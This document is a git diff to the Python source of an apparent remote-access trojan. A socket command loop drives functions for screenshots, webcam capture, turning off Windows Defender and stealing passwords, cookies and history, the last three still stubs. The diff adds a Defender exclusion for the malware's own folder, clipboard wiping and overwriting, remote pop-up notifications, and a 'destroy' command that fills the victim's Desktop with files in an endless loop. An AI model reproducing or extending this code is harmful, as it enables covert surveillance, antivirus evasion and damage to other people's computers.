@@ -1,9 +1,12 @@
-import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time, requests, json, threading,pynput, pyperclip
+import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time, requests, json, threading,pynput, pyperclip, winreg
 
+from win10toast import ToastNotifier
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from colorama import Fore
 from getpass import getuser
+
+
 
 class Functions:
     def list_dir(self):
@@ -67,21 +70,33 @@ class Functions:
 
         self.camera.release()
 
-    def steal_password(self):
-        return f"{Fore.RED}Error!{Fore.RESET}"
-
     def take_screenshot(self):
-        self.screenshot = pyautogui.screenshot("error.png")
-        return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
+        try:
+            self.screenshot = pyautogui.screenshot("error.png")
+            return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
     def voice(self):
         return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
 
+    def steal_password(self):
+        try:
+            return f"{Fore.RED}Currently under development!{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
     def steal_cookie(self):
-        return f"{Fore.RED}Currently under development!{Fore.RESET}"
+        try:
+            return f"{Fore.RED}Currently under development!{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
     def steal_history(self):
-        return f"{Fore.RED}Currently under development!{Fore.RESET}"
+        try:
+            return f"{Fore.RED}Currently under development!{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
     def defender_off(self):
         try:
@@ -106,7 +121,8 @@ class Functions:
     def exclusion(self):
         try:
             if ctypes.windll.shell32IsUserAnAdmin():
-                self.exclusion = subprocess.run(['powershell', '-Command', r"Add-MpPreference -ExclusionPath 'C:\Path\To\Your\Application'"],capture_output=True, text=True)
+                self.script_directory = os.path.dirname(os.path.realpath(sys.argv[0]))
+                self.exclusion = subprocess.run(['powershell', '-Command', f"Add-MpPreference -ExclusionPath '{self.script_directory}'"],capture_output=True, text=True)
                 return f"{Fore.GREEN}Succsesfully exclusion! {self.exclusion}{Fore.RESET}"
             else:
                 return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
@@ -129,8 +145,8 @@ class Functions:
 
     def open_program(self, data):
         try:
-            subprocess.Popen([data])
-            return f"{Fore.GREEN}Succsessfully opened{Fore.RESET}"
+            self.open = subprocess.Popen([data])
+            return f"{Fore.GREEN}Succsessfully opened {self.open}{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
@@ -309,6 +325,48 @@ class Functions:
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
+    def clipboard_delete(self):
+        try:
+            self.delete = pyperclip.copy(' ')
+            return f"{Fore.GREEN}Succsesfully deleted clipboard!{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
+    def clipboard_rename(self, data):
+        try:
+            self.copy = data
+            pyperclip.copy(self.copy)
+            return f"{Fore.GREEN}Succsesfully changed{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
+    def admin(self):
+        try:
+            return f"{Fore.GREEN}Succsesfully upgrade user admin!{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
+    def destroy(self, conn, name):
+        try:
+            conn.send(f"{Fore.GREEN}Succsesfully started the destroy the PC!{Fore.RESET}".encode())
+            self.number = 0
+            self.desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+            while True:
+                self.number += 1
+                self.file_path = os.path.join(self.desktop_path, f"{name}" + str(self.number) + ".txt")
+                self.olustur = open(self.file_path, "w")
+                self.olustur.close()
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
+    def notification(self, title, content):
+        try:
+            toaster = ToastNotifier()
+            toaster.show_toast(f"{title}", f"{content}", duration=5, threaded=True)
+            return f"{Fore.GREEN}Succsesfully sent the notification!{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
 Functions = Functions()
 
 class Main:
@@ -482,6 +540,27 @@ class Main:
 
                     elif data == "clipboard":
                         conn.send(f"{Functions.clipboard()}".encode())
+
+                    elif data == "clipboard_delete":
+                        conn.send(f"{Functions.clipboard_delete()}".encode())
+
+                    elif data.startswith("clipboard_rename "):
+                        data = data[17:]
+                        conn.send(f"{Functions.clipboard_rename(data)}".encode())
+
+                    elif data == "admin":
+                        conn.send(f"{Functions.admin()}".encode())
+
+                    elif data.startswith("destroy "):
+                        data = data[8:]
+                        Functions.destroy(conn, data)
+
+                    elif data.startswith("notification "):
+                        data = data[13:]
+                        title, content = data.split(",")
+                        title = title.strip()
+                        content = content.strip()
+                        conn.send(f"{Functions.notification(title, content)}".encode())
 
                     elif data == "help" or data == "--help":
                         pass
